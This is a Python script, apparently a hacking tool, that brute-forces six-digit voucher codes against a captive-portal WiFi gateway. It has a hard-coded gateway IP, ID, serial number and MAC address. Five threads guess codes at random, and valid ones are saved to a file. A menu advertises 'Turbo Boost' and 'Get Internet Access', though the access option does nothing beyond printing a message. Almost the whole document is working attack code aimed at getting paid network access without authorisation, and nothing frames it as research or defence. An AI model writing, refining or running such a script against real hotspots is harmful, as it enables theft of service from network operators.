import requests
import random
import time
import threading
import os

# အရောင်များ
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
WHITE = '\033[97m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def clear_screen():
    os.system('clear')

def brute_force_worker():
    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }
        try:
            res = requests.get(url, params=params, timeout=1)
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"{RED}Fail Code: {code}{END}")
            elif res.status_code == 200:
                print(f"{GREEN}[!] SUCCESS FOUND: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Success Code: {code}\n")
                break
        except:
            pass

def start_brute():
    print(f"{CYAN}[+] Turbo Boost Active... Starting Threads...{END}")
    for i in range(5):
        t = threading.Thread(target=brute_force_worker)
        t.start()

def show_menu():
    clear_screen()
    print(f"{YELLOW}==============================={END}")
    print(f"{WHITE}[1] Get Internet Access")
    print(f"[2] Brute-force Access Voucher Code")
    print(f"[3] Recheck Success Code")
    print(f"[0] Exit{END}")
    print(f"{YELLOW}==============================={END}")
    
    choice = input(f"{CYAN}Enter an Option: {END}")
    
    if choice == '1':
        print(f"{GREEN}[+] Checking connectivity...{END}")
        time.sleep(2)
        print(f"{RED}[!] No Active Session Found.{END}")
    elif choice == '2':
        start_brute()
    elif choice == '3':
        if os.path.exists("success.txt"):
            print(f"{GREEN}[+] Saved Success Codes:{END}")
            with open("success.txt", "r") as f:
                print(f"{WHITE}{f.read()}{END}")
        else:
            print(f"{RED}[!] No success codes saved yet.{END}")
    elif choice == '0':
        exit()
    else:
        print(f"{RED}[!] Invalid Option!{END}")
    
    input(f"\n{YELLOW}Press Enter to go back to Menu...{END}")
    show_menu()

if __name__ == "__main__":
    show_menu()
